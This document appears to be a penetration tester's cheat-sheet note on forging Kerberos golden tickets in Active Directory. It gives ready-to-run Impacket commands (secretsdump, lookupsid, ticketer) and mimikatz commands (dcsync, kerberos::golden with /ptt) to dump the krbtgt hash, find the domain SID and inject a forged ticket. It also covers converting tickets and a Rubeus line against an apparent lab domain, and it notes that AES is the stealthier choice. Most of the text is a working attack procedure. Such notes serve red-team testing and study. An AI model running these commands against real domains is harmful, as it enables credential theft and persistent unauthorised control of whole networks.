# Golden Tickets

>Silver and golden tickets are forged Kerberos tickets that can be used with pass-the-ticket to access services in an Active Directory domain.
>
**Golden ticket**: The NT hash (or AES key) of the special account `krbtgt` can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with pass-the-ticket to access any resource within the AD domain.
>
In order to craft a golden ticket, testers need to find the krbtgt's NT hash or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges. Because of this, golden tickets only allow lateral movement and not privilege escalation. The domain SID is also required.
>
Microsoft uses AES 256 bits by default. Using this encryption algorithm will be stealthier.
>
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```shell
# Retrieve the krbtgt NT hash or AES key
secretsdump.py -just-dc-user krbtgt -hashes 'LMhash:NThash' 'DOMAIN/DomainAdmin@DomainController'

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser
```

On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used.
```shell
# Retrieve the krbtgt NT hash or AES keys
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

# Dump the domain SID
lsadump::lsa /inject /name:krbtgt

kerberos::golden /User:Administrator /domain:MARVEL.LOCAL /sid:$SID /krbtgt:NT /id:500 /ptt

misc::cmd

# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically inject the ticket. 

#### Convert ticket to UNIX <-> Windows format
To convert tickets between UNIX/Windows format with [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py).
```shell
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```

[[impacket]]
```
./Rubeus.exe asktgs /ticket:ticket.kirbi /service:CIFS/DC01.GHOST.HTB /dc:GHOST.HTB /ptt /outfile:ticket.kirbi
```